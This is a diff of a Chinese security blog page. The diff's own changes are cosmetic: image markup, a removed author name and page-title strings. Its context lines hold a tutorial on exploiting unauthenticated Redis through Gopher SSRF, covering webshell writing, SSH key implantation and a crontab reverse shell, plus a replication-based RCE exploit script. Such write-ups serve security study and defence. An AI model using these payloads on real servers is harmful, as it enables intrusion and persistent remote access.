@@ -77,7 +77,7 @@
           <img src="/img/avatar.jpg">
         </a>
         <hgroup class="introduce">
-          <h5 class="nickname">七友</h5>
+          <h5 class="nickname"></h5>
           <a href="mailto:1920854803@qq.com" title="1920854803@qq.com" class="mail">1920854803@qq.com</a>
         </hgroup>
       </div>
@@ -234,8 +234,21 @@ OK
 
 </code></pre>
 <p>抓到的数据包如下</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713085931-794d2d5e-a509-1.png" alt="image.png"><br>hex转储看一下</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713090053-a9d401f0-a509-1.png" alt="image.png"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713085931-794d2d5e-a509-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>hex转储看一下</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713090053-a9d401f0-a509-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
 <p>正如我们前面所说的，客户端向将命令作为<code>Bulk Strings</code>的RESP数组发送到Redis服务器，然后服务器根据命令实现回复给客户端一种RESP类型。<br>我们就拿上面的数据包分析，首先是<code>*3</code>，代表数组的长度为3（可以简单理解为用空格为分隔符将命令分割为[“set”,”name”,”test”]）；<code>$4</code>代表字符串的长度，<code>0d0a</code>即<code>\r\n</code>表示结束符；<code>+OK</code>表示服务端执行成功后返回的字符串</p>
 <h1 id="Redis配合gopher协议进行SSRF"><a href="#Redis配合gopher协议进行SSRF" class="headerlink" title="Redis配合gopher协议进行SSRF"></a>Redis配合gopher协议进行SSRF</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p><code>Gopher</code> 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议，不过现在gopher协议用得已经越来越少了<br><code>Gopher</code> 协议可以说是SSRF中的万金油，。利用此协议可以攻击内网的 redis、ftp等等，也可以发送 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面。</p>
 <h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><pre><code>能未授权或者能通过弱口令认证访问到Redis服务器
@@ -289,11 +302,23 @@ payload<span class="token operator">=</span>protocol<span class="token operator"
         payload <span class="token operator">+=</span> urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>redis_format<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>
     <span class="token keyword">print</span> payload
 </code></pre>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713184952-f1bb74e2-a55b-1.png" alt="image.png"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713184952-f1bb74e2-a55b-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
 <p>生成payload后，用<code>curl</code>打一波</p>
 <p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713184859-d1be7432-a55b-1.png" alt="image.png"></p>
 <p>执行成功，我们看一波shell是否写入成功</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713185023-04486f84-a55c-1.png" alt="image.png"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713185023-04486f84-a55c-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
 <p>成功写入</p>
 <h2 id="写ssh公钥"><a href="#写ssh公钥" class="headerlink" title="写ssh公钥"></a>写ssh公钥</h2><p>如果<code>.ssh</code>目录存在，则直接写入<code>~/.ssh/authorized_keys</code><br>如果不存在，则可以利用<code>crontab</code>创建该目录</p>
 <h3 id="构造payload-1"><a href="#构造payload-1" class="headerlink" title="构造payload"></a>构造payload</h3><p>构造redis命令</p>
@@ -308,9 +333,35 @@ save
 ssh_pub<span class="token operator">=</span><span class="token string">"\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali\n\n"</span>
 path<span class="token operator">=</span><span class="token string">"/root/.ssh/"</span>
 </code></pre>
-<p>生成payload<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713183658-246f246c-a55a-1.png" alt="image.png"><br><code>curl</code>打一波<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713183322-a37e93d8-a559-1.png" alt="image.png"><br>我们来查看一波是否成功写入</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713183413-c1a43818-a559-1.png" alt="image.png"><br>成功写入，尝试连接</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713183504-e0404db6-a559-1.png" alt="image.png"><br>成功连接</p>
+<p>生成payload<br></p><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713183658-246f246c-a55a-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure><br><code>curl</code>打一波<br><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713183322-a37e93d8-a559-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure><br>我们来查看一波是否成功写入<p></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713183413-c1a43818-a559-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>成功写入，尝试连接</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713183504-e0404db6-a559-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>成功连接</p>
 <h2 id="利用contrab计划任务反弹shell"><a href="#利用contrab计划任务反弹shell" class="headerlink" title="利用contrab计划任务反弹shell"></a>利用contrab计划任务反弹shell</h2><p>这个方法只能<code>Centos</code>上使用，<code>Ubuntu上行不通</code>，原因如下：</p>
 <ol>
 <li><p>因为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件<code>/var/spool/cron/crontabs/&lt;username&gt;</code>权限必须是600也就是<code>-rw-------</code>才会执行，否则会报错<code>(root) INSECURE MODE (mode 0600 expected)</code>，而Centos的定时任务文件<code>/var/spool/cron/&lt;username&gt;</code>权限644也能执行</p>
@@ -332,8 +383,20 @@ cron<span class="token operator">=</span><span class="token string">"\n\n\n\n*/1
 filename<span class="token operator">=</span><span class="token string">"root"</span>
 path<span class="token operator">=</span><span class="token string">"/var/spool/cron"</span>
 </code></pre>
-<p>生成一波，尝试反弹shell<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713174818-57eaa354-a553-1.png" alt="image.png"></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713174721-35fd0ebc-a553-1.png" alt="image.png"></p>
+<p>生成一波，尝试反弹shell<br></p><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713174818-57eaa354-a553-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure><p></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713174721-35fd0ebc-a553-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
 <p>成功反弹shell</p>
 <h1 id="Redis4-x-5-x从SSRF到RCE"><a href="#Redis4-x-5-x从SSRF到RCE" class="headerlink" title="Redis4.x/5.x从SSRF到RCE"></a>Redis4.x/5.x从SSRF到RCE</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前几天看到RR师傅在朋友圈发的redis4.x/5.x rce，原本想去搞搞看的，但是无奈本菜鸡正处于考试预习阶段QAQ，所以没什么心思去看 =。=，直到考完试才安心下来看，不过网上已经很多关于redis rce分析的文章，但是我发现大多数都是一笔带过没怎么看懂（我理解能力比较差），所以决定自己搞一下。</p>
 <h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>redis 4.x/5.x RCE是由<code>LC/BC</code>战队队员<code>Pavel Toporkov</code>在<code>zeronights 2018</code>上提出的基于主从复制的redis rce，演讲的PPT地址为：<a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf" target="_blank" rel="noopener">PPT</a></p>
@@ -344,7 +407,13 @@ path<span class="token operator">=</span><span class="token string">"/var/spool/
 <h3 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h3><p>主从复制的概述：</p>
 <pre><code>主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。
 redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中，但是如果硬盘的数据被删除的话数据就无法恢复了，如果通过主从复制就能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis。
-</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712203930-18130eb2-a4a2-1.png" alt="image.png"></p>
+</code></pre><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712203930-18130eb2-a4a2-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
 <p>建立主从复制，有3种方式：</p>
 <ol>
 <li>配置文件写入<code>slaveof &lt;master_ip&gt; &lt;master_port&gt;</code></li>
@@ -379,8 +448,22 @@ root@kali:/usr/bin# redis-cli -p 6379
 <h3 id="redis-module"><a href="#redis-module" class="headerlink" title="redis module"></a>redis module</h3><p>自从Redis4.x之后redis新增了一个模块功能，Redis模块可以使用外部模块扩展Redis功能，以一定的速度实现新的Redis命令，并具有类似于核心内部可以完成的功能。<br>Redis模块是动态库，可以在启动时或使用<code>MODULE LOAD</code>命令加载到Redis中。</p>
 <p>恶意so文件编写：<a href="https://github.com/n0b0dyCN/redis-rogue-server/tree/master/RedisModulesSDK" title="https://github.com/n0b0dyCN/redis-rogue-server/tree/master/RedisModulesSDK" target="_blank" rel="noopener">https://github.com/n0b0dyCN/redis-rogue-server/tree/master/RedisModulesSDK</a></p>
 <h3 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h3><p>利用步骤，贴一下PPT上的步骤</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712235651-a9a794c2-a4bd-1.png" alt="image.png"><br>slave和master的握手协议过程</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713002514-a0feb180-a4c1-1.png" alt="image.png"><br>图中一些常量说明</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712235651-a9a794c2-a4bd-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>slave和master的握手协议过程</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713002514-a0feb180-a4c1-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>图中一些常量说明</p>
 <pre><code>#define REPL_STATE_CONNECTING 2 /* 等待和master连接 */
 /* --- 握手状态开始 --- */
 #define REPL_STATE_RECEIVE_PONG 3 /* 等待PING返回 */
@@ -402,11 +485,23 @@ root@kali:/usr/bin# redis-cli -p 6379
 <li>-ERR：当前master还不支持PSYNC。</li>
 </ol>
 <p><strong>全量复制的过程：</strong></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713004119-dfd75b44-a4c3-1.png" alt="image.png"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713004119-dfd75b44-a4c3-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
 <ul>
 <li>slave向master发送PSYNC请求，并携带master的runid和offest，如果是第一次连接的话slave不知道master的runid，所以会返回runid为<code>?</code>，offest为<code>-1</code>，我们来测试以下看看是不是真的如此</li>
 </ul>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713004651-a59d01da-a4c4-1.png" alt="image.png"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713004651-a59d01da-a4c4-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
 <ul>
 <li><p>master验证slave发来的runid是否和自身runid一致，如不一致，则进行全量复制，slave并对master发来的runid和offest进行保存</p>
 </li>
@@ -420,7 +515,13 @@ root@kali:/usr/bin# redis-cli -p 6379
 </li>
 </ul>
 <p><strong>增量复制（又称部分复制）过程：</strong></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713005510-cf74b1aa-a4c5-1.png" alt="image.png"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713005510-cf74b1aa-a4c5-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
 <p>增量复制的过程这里简单带过一下：就是当slave向master要求数据同步时，会发送master的runid和offest，如果runid和slave上的不对应则会进行全量复制，如果相同则进行数据同步，但是不会传输RDB文件</p>
 <p>通过了解全量复制和增量复制的过程，我们应该大致知道为什么一定要用全量复制而不用增量复制了。</p>
 <h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><ul>
@@ -433,7 +534,13 @@ REPLCONF 发送REPLCONF capa
 PSYNC &lt;rundi&gt; &lt;offest&gt; 发送PSYNC
 </code></pre>如下图所示：</li>
 </ul>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713014728-1d6e49a0-a4cd-1.png" alt="image.png"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713014728-1d6e49a0-a4cd-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
 <ul>
 <li>将要攻击的redis服务器设置成我们的slave</li>
 </ul>
@@ -533,7 +640,13 @@ exp_filename<span class="token operator">=</span><span class="token string">"exp
     interact_shell<span class="token punctuation">(</span>redis_sock<span class="token punctuation">)</span>
 </code></pre>
 <p>效果图</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712154011-4783cdd2-a478-1.png" alt="image.png"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712154011-4783cdd2-a478-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
 <h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://redis.io/topics/protocol" title="https://redis.io/topics/protocol" target="_blank" rel="noopener">https://redis.io/topics/protocol</a><br><a href="https://www.cnblogs.com/kismetv/p/9236731.html#t1" title="https://www.cnblogs.com/kismetv/p/9236731.html#t1" target="_blank" rel="noopener">https://www.cnblogs.com/kismetv/p/9236731.html#t1</a><br><a href="http://duqingfeng.net/2018/06/08/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E2%80%94%E2%80%94%E5%85%A8%E9%87%8F%E5%A4%8D%E5%88%B6%E4%B8%8E%E5%A2%9E%E9%87%8F%E5%A4%8D%E5%88%B6%E6%80%BB%E7%BB%93/" title="http://duqingfeng.net/2018/06/08/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E2%80%94%E2%80%94%E5%85%A8%E9%87%8F%E5%A4%8D%E5%88%B6%E4%B8%8E%E5%A2%9E%E9%87%8F%E5%A4%8D%E5%88%B6%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">http://duqingfeng.net/2018/06/08/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E2%80%94%E2%80%94%E5%85%A8%E9%87%8F%E5%A4%8D%E5%88%B6%E4%B8%8E%E5%A2%9E%E9%87%8F%E5%A4%8D%E5%88%B6%E6%80%BB%E7%BB%93/</a><br><a href="https://www.cnblogs.com/hongmoshui/p/10594639.html" title="https://www.cnblogs.com/hongmoshui/p/10594639.html" target="_blank" rel="noopener">https://www.cnblogs.com/hongmoshui/p/10594639.html</a><br><a href="https://xz.aliyun.com/t/5616" title="https://xz.aliyun.com/t/5616" target="_blank" rel="noopener">https://xz.aliyun.com/t/5616</a><br><a href="https://joychou.org/web/hackredis-enhanced-edition-script.html" title="https://joychou.org/web/hackredis-enhanced-edition-script.html" target="_blank" rel="noopener">https://joychou.org/web/hackredis-enhanced-edition-script.html</a></p>
 <script>
         document.querySelectorAll('.github-emoji')
@@ -572,8 +685,8 @@ exp_filename<span class="token operator">=</span><span class="token string">"exp
     
     <footer>
         <a href="https://byqiyou.github.io">
-            <img src="/img/avatar.jpg" alt="七友">
-            七友
+            <img src="/img/avatar.jpg" alt="">
+            
         </a>
     </footer>
 </blockquote>
@@ -745,7 +858,7 @@ exp_filename<span class="token operator">=</span><span class="token string">"exp
         </p>
     </div>
     <div class="bottom">
-        <p><span>七友 &copy; 2015 - 2019</span>
+        <p><span> &copy; 2015 - 2019</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
@@ -848,10 +961,10 @@ var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
     var OriginTitile = document.title, titleTime;
     document.addEventListener('visibilitychange', function() {
         if (document.hidden) {
-            document.title = '死鬼去哪里了！';
+            document.title = 'Leave';
             clearTimeout(titleTime);
         } else {
-            document.title = '(つェ⊂)咦!又好了!';
+            document.title = 'Come back';
             titleTime = setTimeout(function() {
                 document.title = OriginTitile;
             },2000);
